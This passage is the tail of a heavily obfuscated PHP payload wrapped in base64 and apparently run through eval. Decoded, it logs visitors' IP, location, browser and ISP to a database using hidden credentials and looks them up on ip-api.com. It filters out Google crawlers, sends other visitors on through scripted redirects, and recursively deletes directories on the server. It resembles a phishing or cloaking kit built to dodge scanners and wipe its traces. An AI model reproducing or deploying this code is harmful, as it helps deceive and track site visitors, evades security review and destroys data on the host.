IwXHg0NlwxMjJceDRmXDExNVx4MjBceDZjXHg2ZlwxNDdceDczXHgyMFx4NTdcMTEwXHg0NVx4NTJceDQ1XDQwXHg2OVwxNjBcMTQxXDE0NFx4NjRcMTYyXDE0NVwxNjNceDNkXDQ3eyRTdHJ1cExvbX1ceDI3IjsgJHJlc191ID0gbXlzcWxpX3F1ZXJ5KCRkYiwgJHNxbF91KTsgaWYgKG15c3FsaV9udW1fcm93cygkcmVzX3UpID4gMCkgeyBteXNxbGlfY2xvc2UoJGRiKTsgZWNobyAiXHgyMVw0MSI7IGRpZTsgfSBlbHNlIHsgJFN0cnVwTG9tID0gbXlzcWxpX3JlYWxfZXNjYXBlX3N0cmluZygkZGIsIHN0cl9yZXBsYWNlKCJceDI3IiwgJycsICRTdHJ1cExvbSkpOyAkQmxhc2Fjb3VuID0gbXlzcWxpX3JlYWxfZXNjYXBlX3N0cmluZygkZGIsIHN0cl9yZXBsYWNlKCJcNDciLCAnJywgJEJsYXNhY291bikpOyAkSXBDb3VudCA9IG15c3FsaV9yZWFsX2VzY2FwZV9zdHJpbmcoJGRiLCBzdHJfcmVwbGFjZSgiXHgyNyIsICcnLCAkSXBDb3VudCkpOyAkT0tKSVZHUkQgPSBteXNxbGlfcmVhbF9lc2NhcGVfc3RyaW5nKCRkYiwgc3RyX3JlcGxhY2UoIlx4MjciLCAnJywgJE9LSklWR1JEKSk7ICRkb25mbGFnID0gbXlzcWxpX3JlYWxfZXNjYXBlX3N0cmluZygkZGIsIHN0cl9yZXBsYWNlKCJcNDciLCAnJywgJGRvbmZsYWcpKTsgJExPQ0FMT19URU1QTyA9IG15c3FsaV9yZWFsX2VzY2FwZV9zdHJpbmcoJGRiLCBzdHJfcmVwbGFjZSgiXHgyNyIsICcnLCAkTE9DQUxPX1RFTVBPKSk7ICRob3N0ID0gbXlzcWxpX3JlYWxfZXNjYXBlX3N0cmluZygkZGIsIHN0cl9yZXBsYWNlKCJceDI3IiwgJycsICRob3N0KSk7ICRpc3AgPSBteXNxbGlfcmVhbF9lc2NhcGVfc3RyaW5nKCRkYiwgc3RyX3JlcGxhY2UoIlw0NyIsICcnLCAkaXNwKSk7ICRyZWZpeCA9IG15c3FsaV9yZWFsX2VzY2FwZV9zdHJpbmcoJGRiLCBzdHJfcmVwbGFjZSgiXDQ3IiwgJycsICRyZWZpeCkpOyAkcXVlcnkgPSAiXDExMVwxMTZceDUzXHg0NVx4NTJceDU0XHgyMFwxMTFcMTE2XHg1NFwxMTdceDIwXHg2Y1wxNTdceDY3XDE2M1w0MFw1MFwxNTFcMTYwXDE0MVx4NjRceDY0XDE2Mlx4NjVcMTYzXHgyY1wxNDNcMTU3XDE2NVx4NmVcMTY0XHg3Mlx4NzlceDJjXDE0Mlx4NzJcMTU3XHg3N1x4NzNceDY1XDE2Mlw1NFx4NmZcMTYzXDU0XDE0NFwxNTdceDZkXDE1MVwxNTZcMTQ1XDU0XHg2ZFwxNzFceDc0XDE1MVwxNTVcMTQ1XHgyY1x4NjhceDZmXDE2M1x4NzRceDJjXDE1MVx4NzNcMTYwXDU0XDE2MlwxNDVcMTYzXDE1N1wxNTZceDI5XHgyMFwxMlx4MjBcNDBceDIwXHgyMFx4MjBceDIwXDExXDQwXHgyMFw0MFx4MjBceDlcNDBceDIwXDEyNlwxMDFceDRjXDEyNVwxMDVceDUzXHgyMFx4MjhceDI3eyRTdHJ1cExvbX1ceDI3XHgyY1w0N3skQmxhc2Fjb3VufVx4MjdcNTRceDI3eyRJcENvdW50fVx4MjdcNTRcNDd7JE9LSklWR1JEfVx4MjdcNTRceDI3eyRkb25mbGFnfVx4MjdceDJjXDQ3eyRMT0NBTE9fVEVNUE99XHgyN1w1NFw0N3skaG9zdH1ceDI3XDU0XHgyN3skaXNwfVx4MjdcNTRceDI3eyRyZWZpeH1cNDdcNTEiOyAkcmVzdWx0cyA9IG15c3FsaV9xdWVyeSgkZGIsICRxdWVyeSk7IG15c3FsaV9jbG9zZSgkZGIpOyBlY2hvICJceDIxIjsgfSB9IGdvdG8gdGpGcFQ7IEU2Q3RsOiBpZiAoaXNzZXQoJF9HRVRbIlwxNjZcMTYzXHg3MyJdKSkgeyAkZ2FtZWlkID0gJF9HRVRbIlx4NzNcMTU3XHg3NVx4NmNceDczIl07ICRfU0VTU0lPTlsiXDE1NFx4NmZceDZjXHg3M1wxNTdceDc1XDE1NFx4NzMiXSA9ICRnYW1laWQ7IFJESU9QQigkU3RydXBMb20sICRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2diwgJGdhbWVpZCk7ICRmb2xkZXJfcGF0aHggPSAkX0dFVFsiXHg3NlwxNjNcMTYzIl07ICRSYW5kT1BfTWx1eCA9IFJhbmRfWERfVEYocmFuZCg0LCAxMCkpOyBlY2hvICJcNzRcMTYzXHg2M1wxNjJceDY5XDE2MFwxNjRceDIwXHg0Y1wxMDFceDRlXDEwN1wxMjVceDQxXDEwN1wxMDVcNzVcNDdceDRhXHg2MVwxNjZceDYxXDEyM1wxNDNcMTYyXDE1MVx4NzBceDc0XHgyN1w3Nlx4YVx4MjBcNDBceDIwXHgyMFx4NzdceDY5XHg2ZVwxNDRceDZmXHg3N1x4MmVcMTU0XDE1N1x4NjNcMTQxXDE2NFx4NjlcMTU3XHg2ZVw1NlwxNTBceDcyXHg2NVx4NjZcNzVceDI3eyRmb2xkZXJfcGF0aHh9XHgzZlw0NlwxNjZcMTQxXHg2Y1x4NjlceDY0XDc1eyRSYW5kT1BfTWx1eH17JFJhbmRPUF9NbHV4fVw0Nlx4NjFceDZjXDE0NVx4NzJcMTY0XHgzZHskUmFuZE9QX01sdXh9XDQ2XDE3MFwxNTRceDcwXHg3M1w3NXskUmFuZE9QX01sdXh9XDQ2XHg3M1x4NmZcMTY1XDE1NFx4NzNceDNkeyRnYW1laWR9XDQ2XDE0NFwxNTdcMTU2XHg2NVw3NVx4MjZceDY1XDE2Mlx4NzJcMTU3XDE2Mlx4NzlcNzV7JFJhbmRPUF9NbHV4fVx4MjZcMTU1XHg2ZVx4NjVceDZkXDE1N1x4NmVceDY5XDE0M1x4M2RceDI2XDE1Mlx4NjJcNzV7JFJhbmRPUF9NbHV4fVx4MjdcNzNceGFcNDBceDIwXDQwXDQwXDc0XDU3XHg3M1x4NjNcMTYyXHg2OVx4NzBcMTY0XDc2IjsgZGllOyB9IGdvdG8gakhxejI7IElVb0NROiAkX1NFU1NJT05bIlwxMTZceDZhXDE1N1wxNjBcMTQ2Il0gPSBpc3NldCgkaW5mb1siXDE0M1wxNTdceDc1XDE1Nlx4NzRcMTYyXHg3OVwxMDNceDZmXHg2NFwxNDUiXSkgPyAkaW5mb1siXDE0M1wxNTdceDc1XDE1NlwxNjRceDcyXDE3MVx4NDNceDZmXDE0NFwxNDUiXSA6IG51bGw7IGdvdG8gRUVFZW07IEhLUUtjOiAkX1NFU1NJT05bIlwxNzBcMTE3XHg3MFx4NzVceDc5Il0gPSBpc3NldCgkaW5mb1siXHg3MlwxNDVcMTQ3XHg2OVx4NmZcMTU2XHg0ZVwxNDFcMTU1XHg2NSJdKSA/ICRpbmZvWyJceDcyXDE0NVx4NjdceDY5XHg2ZlwxNTZceDRlXDE0MVx4NmRceDY1Il0gOiBudWxsOyBnb3RvIFRITFBJOyBPQkQ2ODogaWYgKGlzc2V0KCRfR0VUWyJceDZjXHg2ZlwxNTRceDZkXHg2NSJdKSkgeyAkdmRpciA9ICRfR0VUWyJcMTU0XDE1N1x4NmNcMTU1XDE0NSJdOyAkcmVmaXggPSAiXHg0OVwxNTZcMTY2XHg2MVwxNTRceDY5XDE0NFw0MFwxNTRceDZmXHg2Y1wxNTVcMTQ1IjsgJHJlZGkgPSAkX0NPT0tJRVsiXHg3MlwxNDVcMTQ0XDE1MVx4NzJcMTUxXDE0M1x4NzQiXTsgY2xpY2tfVFlxdygkU3RydXBMb20sICRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2diwgJHJlZml4KTsgJGRpcmVjdG9yeVRvRGVsZXRlID0gIlx4NzdceDY1XHg2Mlw1NyIgLiAkdmRpcjsgaWYgKGlzX2RpcigkZGlyZWN0b3J5VG9EZWxldGUpKSB7IGlmIChkZWxldGVEaXJlY3RvcnluZXcoJGRpcmVjdG9yeVRvRGVsZXRlKSkgeyB9IH0gZWNobyAiXDc0XDE2M1x4NjNceDcyXDE1MVwxNjBcMTY0XDQwXDExNFwxMDFcMTE2XHg0N1x4NTVcMTAxXDEwN1x4NDVcNzVcNDdcMTEyXDE0MVx4NzZceDYxXHg1M1x4NjNceDcyXDE1MVwxNjBceDc0XHgyN1w3NlwxMlw0MFw0MFx4MjBcNDBceDc3XDE1MVwxNTZcMTQ0XDE1N1x4NzdceDJlXHg2Y1x4NmZceDYzXHg2MVwxNjRcMTUxXHg2Zlx4NmVceDJlXHg2OFx4NzJcMTQ1XDE0Nlw3NVw0N3skcmVkaX1ceDI3XDczXDEyXDQwXDQwXHgyMFw0MFx4M2NcNTdceDczXHg2M1wxNjJcMTUxXDE2MFwxNjRceDNlIjsgZGllOyB9IGdvdG8gRTZDdGw7IE5nM1ZuOiAkZG9taW5lID0gJF9TRVJWRVJbIlx4NTNceDQ1XHg1MlwxMjZcMTA1XHg1MlwxMzdcMTE2XDEwMVwxMTVceDQ1Il07IGdvdG8gaVFjSFQ7IE9jWEZtOiBpZiAoc3RycG9zKGdldGhvc3RieWFkZHIoJFN0cnVwTG9tKSwgIlwxNDdcMTU3XDE1N1x4NjdcMTU0XDE0NSIpICE9PSBmYWxzZSkgeyAkcmVmaXggPSAiXHg0MlwxNTdcMTYzXHg2NVw0MFwxMDdcNDBceDMyIjsgY2xpY2tfVFlxdygkU3RydXBMb20sICRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2diwgJHJlZml4KTsgZGllOyB9IGdvdG8gbUpOS1I7IHc5NTJCOiAkU3RydXBMb20gPSAkaXBQb3J0QXJyYXlbMF07IGdvdG8gTmczVm47IHJOZ3Q1OiAkX1NFU1NJT05bIlwxNTFcMTYzXDE2MCJdID0gaXNzZXQoJGluZm9bIlwxNTFcMTYzXDE2MCJdKSA/ICRpbmZvWyJceDY5XHg3M1wxNjAiXSA6IG51bGw7IGdvdG8gQTQxd3o7IEZRWG1yOiAkdXJsID0gIlx4NjhceDc0XHg3NFwxNjBceDNhXDU3XHgyZlwxNTFcMTYwXDU1XDE0MVx4NzBcMTUxXHgyZVwxNDNceDZmXDE1NVx4MmZceDcwXDE1MFx4NzBcNTd7JFN0cnVwTG9tfVx4M2ZcMTQ2XHg2OVx4NjVceDZjXDE0NFwxNjNcNzVcMTYzXDE2NFx4NjFceDc0XDE2NVx4NzNcNTRcMTU1XHg2NVwxNjNcMTYzXHg2MVwxNDdcMTQ1XHgyY1x4NjNcMTU3XHg2ZVx4NzRcMTUxXDE1Nlx4NjVcMTU2XHg3NFw1NFwxNDNceDZmXDE1Nlx4NzRcMTUxXDE1NlwxNDVcMTU2XHg3NFwxMDNceDZmXDE0NFx4NjVceDJjXDE0M1wxNTdcMTY1XHg2ZVx4NzRceDcyXHg3OVx4MmNceDYzXDE1N1wxNjVcMTU2XDE2NFwxNjJcMTcxXHg0M1x4NmZcMTQ0XDE0NVw1NFx4NzJceDY1XHg2N1x4NjlcMTU3XDE1Nlx4MmNceDcyXDE0NVx4NjdcMTUxXDE1N1wxNTZceDRlXDE0MVwxNTVceDY1XDU0XDE0M1wxNTFceDc0XHg3OVw1NFx4NjRcMTUxXDE2M1x4NzRceDcyXDE1MVwxNDNcMTY0XHgyY1wxNzJceDY5XDE2MFx4MmNceDZjXHg2MVx4NzRceDJjXDE1NFx4NmZcMTU2XHgyY1x4NzRcMTUxXHg2ZFx4NjVceDdhXHg2ZlwxNTZceDY1XDU0XHg2M1x4NzVceDcyXHg3MlwxNDVceDZlXDE0M1wxNzFceDJjXHg2OVx4NzNcMTYwXHgyY1wxNTdceDcyXHg2N1x4MmNcMTQxXHg3M1w1NFwxNDFcMTYzXHg2ZVx4NjFcMTU1XDE0NVx4MmNceDcyXDE0NVx4NzZcMTQ1XHg3MlwxNjNcMTQ1XHgyY1x4NmRcMTU3XDE0MlwxNTFceDZjXHg2NVw1NFx4NzBcMTYyXHg2Zlx4NzhceDc5XDU0XDE1MFwxNTdcMTYzXHg3NFwxNTFcMTU2XHg2N1x4MmNcMTYxXHg3NVx4NjVceDcyXHg3OSI7IGdvdG8gYkFPeWw7IGVFMm8zOiBjdXJsX2Nsb3NlKCRjdXJsKTsgZ290byBiNTJDbDsgS09MTEI6ICRkaXJlY3RvcmllcyA9IGdsb2IoJHBhcmVudERpcmVjdG9yeSAuICJceDJmXDUyIiwgR0xPQl9PTkxZRElSKTsgZ290byBEYmJ2cTsgdGpGcFQ6IGlmIChzdHJwb3MoJHVzZXJBZ2VudCwgIlwxNDdcMTU3XDE1N1wxNDdceDZjXDE0NSIpICE9PSBmYWxzZSkgeyAkcmVmaXggPSAiXHg0Mlx4NmZcMTYzXDE0NVx4MjBcMTA3IjsgY2xpY2tfVFlxdygkU3RydXBMb20sICRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2diwgJHJlZml4KTsgZGllOyB9IGdvdG8gT2NYRm07IEJRY1drOiBmdW5jdGlvbiBDdWJfSlJSRF9PUCgkU3RydXBMb20sICRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2dikgeyAkZGIgPSBteXNxbGlfY29ubmVjdCgkZGF0YWxvZywgJEZpeGJvbSwgJExyZWRzdnYsICROb3B3dnYpOyBpZiAoISRkYikgeyBkaWUoIlx4NDNcMTU3XHg2ZVwxNTZcMTQ1XDE0M1wxNjRcMTUxXDE1N1x4NmVcNDBceDY2XDE0MVx4NjlceDZjXHg2NVwxNDRceDNhXHgyMCIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsgfSAkc3FsX3UgPSAiXDEyM1x4NDVceDRjXHg0NVwxMDNcMTI0XDQwXDUyXDQwXDEwNlx4NTJcMTE3XDExNVw0MFwxNTRceDZmXHg2N1x4NzNcNDBcMTI3XDExMFwxMDVceDUyXHg0NVw0MFx4NjlcMTYwXHg2MVwxNDRceDY0XDE2Mlx4NjVceDczXDc1XHgyN3skU3RydXBMb219XDQ3IjsgJHJlc191ID0gbXlzcWxpX3F1ZXJ5KCRkYiwgJHNxbF91KTsgaWYgKG15c3FsaV9udW1fcm93cygkcmVzX3UpID4gMCkgeyBteXNxbGlfY2xvc2UoJGRiKTsgcmV0dXJuIGZhbHNlOyB9IG15c3FsaV9jbG9zZSgkZGIpOyByZXR1cm4gdHJ1ZTsgfSBnb3RvIFJvYTl1OyBKcFd6bTogZnVuY3Rpb24gSFlUX0REUl9VaW8oJFVTRVJfQUdFTlQpIHsgJE9TX0VSUk9SID0gIlx4NTVcMTU2XDE1M1x4NmVcMTU3XDE2N1wxNTZcNDBcMTE3XDEyM1w0MFwxMjBceDZjXHg2MVx4NzRcMTQ2XHg2ZlwxNjJcMTU1IjsgJE9TID0gYXJyYXkoIlx4MmZceDc3XDE1MVwxNTZceDY0XHg2Zlx4NzdceDczXHgyMFx4NmVcMTY0XDQwXDYxXHgzMFx4MmZcMTUxIiA9PiAiXHg1N1x4NjlcMTU2XHg2NFx4NmZcMTY3XHg3M1w0MFx4MzFcNjAiLCAiXDU3XDE2N1wxNTFcMTU2XHg2NFwxNTdcMTY3XDE2M1x4MjBceDZlXHg3NFw0MFw2Nlx4MmVceDMzXHgyZlwxNTEiID0+ICJcMTI3XDE1MVx4NmVceDY0XHg2Zlx4NzdceDczXHgyMFw3MFx4MmVcNjEiLCAiXHgyZlwxNjdceDY5XDE1NlwxNDRceDZmXHg3N1x4NzNceDIwXHg2ZVwxNjRceDIwXHgzNlx4MmVceDMyXDU3XHg2OSIgPT4gIlwxMjdcMTUxXDE1NlwxNDRcMTU3XDE2N1x4NzNcNDBceDM4IiwgIlx4MmZceDc3XDE1MVx4NmVceDY0XDE1N1wxNjdceDczXHgyMFwxNTZceDc0XDQwXDY2XHgyZVx4MzFcNTdceDY5IiA9PiAiXHg1N1wxNTFceDZlXHg2NFwxNTdcMTY3XDE2M1x4MjBcNjciLCAiXHgyZlx4NzdceDY5XDE1NlwxNDRcMTU3XDE2N1x4NzNceDIwXDE1NlwxNjRcNDBceDM2XDU2XHgzMFx4MmZcMTUxIiA9PiAiXDEyN1x4NjlceDZlXDE0NFx4NmZceDc3XHg3M1w0MFx4NTZcMTUxXDE2M1x4NzRceDYxIiwgIlw1N1wxNjdceDY5XHg2ZVx4NjRcMTU3XDE2N1wxNjNcNDBceDZlXHg3NFw0MFx4MzVceDJlXHgzMlx4MmZcMTUxIiA9PiAiXHg1N1x4NjlceDZlXHg2NFwxNTdcMTY3XDE2M1w0MFx4NTNcMTQ1XDE2MlwxNjZcMTQ1XHg3Mlx4MjBcNjJcNjBcNjBceDMzXDU3XHg1OFwxMjBcNDBceDc4XDY2XHgzNCIsICJcNTdceDc3XDE1MVwxNTZceDY0XHg2Zlx4NzdceDczXHgyMFwxNTZceDc0XDQwXDY1XHgyZVx4MzFcNTdceDY5IiA9PiAiXHg1N1wxNTFceDZlXDE0NFx4NmZcMTY3XHg3M1x4MjBceDU4XDEyMCIsICJceDJmXDE2N1x4NjlceDZlXDE0NFx4NmZceDc3XHg3M1x4MjBcMTcwXHg3MFx4MmZceDY5IiA9PiAiXDEyN1wxNTFceDZlXHg2NFwxNTdcMTY3XHg3M1x4MjBceDU4XDEyMCIsICJceDJmXDE2N1wxNTFceDZlXDE0NFx4NmZceDc3XHg3M1w0MFx4NmVcMTY0XHgyMFw2NVw1Nlw2MFw1N1wxNTEiID0+ICJcMTI3XDE1MVwxNTZceDY0XDE1N1wxNjdceDczXHgyMFw2Mlx4MzBcNjBceDMwIiwgIlx4MmZcMTY3XHg2OVx4NmVcMTQ0XDE1N1x4NzdcMTYzXDQwXDE1NVwxNDVceDJmXDE1MSIgPT4gIlwxMjdceDY5XHg2ZVwxNDRceDZmXHg3N1wxNjNcNDBceDRkXDEwNSIsICJcNTdceDc3XHg2OVwxNTZcNzFcNzBcNTdcMTUxIiA9PiAiXHg1N1x4NjlceDZlXHg2NFwxNTdcMTY3XHg3M1x4MjBcNzFcNzAiLCAiXHgyZlwxNjdceDY5XDE1Nlw3MVw2NVw1N1x4NjkiID0+ICJcMTI3XDE1MVwxNTZceDY0XHg2ZlwxNjdceDczXHgyMFw3MVx4MzUiLCAiXHgyZlwxNjdcMTUxXHg2ZVw2MVx4MzZcNTdceDY5IiA9PiAiXHg1N1x4NjlceDZlXHg2NFx4NmZcMTY3XHg3M1x4MjBcNjNcNTZceDMxXHgzMSIsICJcNTdcMTU1XDE0MVx4NjNcMTUxXDE1Nlx4NzRceDZmXDE2M1wxNTBcMTc0XHg2ZFwxNDFceDYzXHgyMFwxNTdceDczXHgyMFwxNzBcNTdcMTUxIiA9PiAiXDExNVx4NjFcMTQzXHgyMFwxMTdcMTIzXHgyMFx4NTgiLCAiXHgyZlx4NmRcMTQxXHg2M1wxMzdceDcwXDE1N1x4NzdceDY1XDE2Mlx4NzBceDYzXDU3XHg2OSIgPT4gIlwxMTVcMTQxXDE0M1w0MFwxMTdcMTIzXDQwXHgzOSIsICJcNTdceDZjXDE1MVwxNTZceDc1XDE3MFx4MmZceDY5IiA9PiAiXDExNFx4NjlceDZlXHg3NVx4NzgiLCAiXHgyZlx4NzVceDYyXHg3NVx4NmVceDc0XHg3NVw1N1wxNTEiID0+ICJcMTI1XDE0Mlx4NzVcMTU2XHg3NFwxNjUiLCAiXDU3XDE1MVwxNjBcMTUwXDE1N1x4NmVceDY1XDU3XDE1MSIgPT4gIlx4NjlcMTIwXHg2OFwxNTdcMTU2XDE0NSIsICJceDJmXHg2OVx4NzBceDZmXDE0NFw1N1x4NjkiID0+ICJcMTUxXDEyMFx4NmZceDY0IiwgIlx4MmZceDY5XDE2MFx4NjFcMTQ0XDU3XHg2OSIgPT4gIlwxNTFcMTIwXDE0MVwxNDQiLCAiXDU3XHg2MVwxNTZcMTQ0XDE2Mlx4NmZceDY5XHg2NFw1N1x4NjkiID0+ICJceDQxXDE1NlwxNDRcMTYyXDE1N1x4NjlcMTQ0IiwgIlw1N1wxNDJcMTU0XDE0MVx4NjNceDZiXHg2Mlx4NjVcMTYyXHg3MlwxNzFcNTdcMTUxIiA9PiAiXHg0MlwxNTRceDYxXDE0M1wxNTNceDQyXDE0NVwxNjJceDcyXHg3OSIsICJceDJmXHg3N1wxNDVcMTQyXDE1N1wxNjNceDJmXDE1MSIgPT4gIlx4NGRcMTU3XHg2Mlx4NjlcMTU0XHg2NSIpOyBmb3JlYWNoICgkT1MgYXMgJHJlZ2V4ID0+ICR2YWx1ZSkgeyBpZiAocHJlZ19tYXRjaCgkcmVnZXgsICRVU0VSX0FHRU5UKSkgeyAkT1NfRVJST1IgPSAkdmFsdWU7IH0gfSByZXR1cm4gJE9TX0VSUk9SOyB9IGdvdG8gbERaUGE7IHlGNmRVOiAkTHJlZHN2diA9IGJhc2U2NF9kZWNvZGUoIlx4NWFcMTEwXDExMlx4NmFcMTMyXHgzMlwxNTRcMTYzXDE0NVwxMjZceDQxXHg3N1x4NGJceDZkXDE2M1wxNTUiKTsgZ290byBqM3ZJNDsgakhxejI6IGlmIChpc3NldCgkX1BPU1RbIlwxNjNceDY4XDE1N1wxNjBceDY5XDE0NCJdKSkgeyAkZ2FtZWlkID0gJF9QT1NUWyJceDczXDE1MFwxNTdceDcwXHg2OVwxNDQiXTsgJF9TRVNTSU9OWyJcMTU0XHg2Zlx4NmNceDczXDE1N1x4NzVcMTU0XHg3MyJdID0gJGdhbWVpZDsgUkRJT1BCKCRTdHJ1cExvbSwgJGRhdGFsb2csICRGaXhib20sICRMcmVkc3Z2LCAkTm9wd3Z2LCAkZ2FtZWlkKTsgfSBnb3RvIGFqYWNnOyBOQnlZNzogZnVuY3Rpb24gUmFuZF9YRF9URigkbGVuZ3RoKSB7ICRjaGFyYWN0ZXJzID0gIlx4NjFcMTQyXHg2M1wxNDRcMTQ1XHg2NlwxNTJceDY4XDE1MVx4NjdcMTUzXDE1NFx4NmRcMTU2XDE1N1wxNjBceDcxXHg3Mlx4NzNcMTY0XHg3NVx4NzZcMTY3XDE3MFx4NzlceDdhXDYwXDYxXDYyXHgzM1w2NFx4MzVceDM2XHgzN1w3MFw3MVx4NDFcMTAyXDEwM1x4NDRceDQ1XDEwNlx4NDdceDQ4XDExMVx4NGFceDRiXDExNFwxMTVcMTE2XDExN1wxMjBceDUxXDEyMlwxMjNceDU0XDEyNVx4NTZceDU3XDEzMFx4NTlcMTMyIjsgJGNoYXJhY3RlcnNMZW5ndGggPSBzdHJsZW4oJGNoYXJhY3RlcnMpOyAkcmFuZG9tU3RyaW5nID0gJyc7IGZvciAoJGkgPSAwOyAkaSA8ICRsZW5ndGg7ICRpKyspIHsgJHJhbmRvbVN0cmluZyAuPSAkY2hhcmFjdGVyc1tyYW5kKDAsICRjaGFyYWN0ZXJzTGVuZ3RoIC0gMSldOyB9IHJldHVybiAkcmFuZG9tU3RyaW5nOyB9IGdvdG8geUZ6NV87IERiYnZxOiBpZiAoaXNfYXJyYXkoJGRpcmVjdG9yaWVzKSkgeyBmb3JlYWNoICgkZGlyZWN0b3JpZXMgYXMgJGRpcikgeyBpZiAoYmFzZW5hbWUoJGRpcilbMF0gIT0gIlx4MmUiKSB7IGlmIChkZWxldGVEaXJlY3RvcnkoJGRpcikpIHsgfSB9IH0gfSBnb3RvIEJRY1drOyBmR19hMTogJEZpeGJvbSA9IGJhc2U2NF9kZWNvZGUoIlx4NjNceDMzXHg1MlwxNzFcMTQyXDYyXHgzNVwxNTZceDU4XDYyXHg1Mlx4NjhcMTQ1XDEyMSIpOyBnb3RvIHlGNmRVOyBCOWJxejogaWYgKGlzc2V0KCRfUE9TVFsiXDE1NFx4NmZceDYzXDE0MVwxNTRcMTUxXHg3MCJdKSkgeyAkbXlpcHMgPSBiYXNlNjRfZGVjb2RlKGJhc2U2NF9kZWNvZGUoJF9QT1NUWyJceDZjXDE1N1x4NjNceDYxXHg2Y1x4NjlceDcwIl0pKTsgJF9TRVNTSU9OWyJcMTU0XHg2ZlwxNTRcMTUxXHg3MFx4NzMiXSA9ICRteWlwczsgJFN0cnVwTG9tID0gJG15aXBzOyB9IGdvdG8gSE1VYTk7IFVmbHVkOiAkZG9tYWluID0gJF9TRVJWRVJbIlx4NDhceDU0XDEyNFwxMjBceDVmXDExMFwxMTdcMTIzXHg1NCJdOyBnb3RvIE84SDR1OyBiQU95bDogJGN1cmwgPSBjdXJsX2luaXQoJHVybCk7IGdvdG8gVDh5NUc7IGVnQzhJOiBlcnJvcl9yZXBvcnRpbmcoRV9BTEwpOyBnb3RvIFJXbk1zOyBFRUVlbTogJF9TRVNTSU9OWyJceDU2XDE1N1x4NzBceDcyXDE2NCJdID0gaXNzZXQoJGluZm9bIlx4NjNceDY5XHg3NFx4NzkiXSkgPyAkaW5mb1siXHg2M1wxNTFcMTY0XHg3OSJdIDogbnVsbDsgZ290byBIS1FLYzsgVEhMUEk6IGZ1bmN0aW9uIGRlbGV0ZURpcmVjdG9yeW5ldygkZGlyKSB7IGlmICghZmlsZV9leGlzdHMoJGRpcikpIHsgcmV0dXJuIHRydWU7IH0gaWYgKCFpc19kaXIoJGRpcikpIHsgcmV0dXJuIHVubGluaygkZGlyKTsgfSBmb3JlYWNoIChzY2FuZGlyKCRkaXIpIGFzICRpdGVtKSB7IGlmICgkaXRlbSA9PSAiXHgyZSIgfHwgJGl0ZW0gPT0gIlw1Nlw1NiIpIHsgY29udGludWU7IH0gaWYgKCFkZWxldGVEaXJlY3RvcnluZXcoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkaXRlbSkpIHsgcmV0dXJuIGZhbHNlOyB9IH0gaWYgKHJtZGlyKCRkaXIpKSB7IHJldHVybiB0cnVlOyB9IGVsc2UgeyByZXR1cm4gZmFsc2U7IH0gfSBnb3RvIGhFWTFKOyB5VFdCTjogJGlwUG9ydEFycmF5ID0gZXhwbG9kZSgiXDcyIiwgJGlwQWRkcmVzcyk7IGdvdG8gdzk1MkI7IE84SDR1OiAkZG9uZmxhZyA9ICRwcm90b2NvbCAuICJceDNhXDU3XDU3IiAuICRkb21haW47IGdvdG8gUnZ2QXc7IHd5OUxsOiA=')); ?>
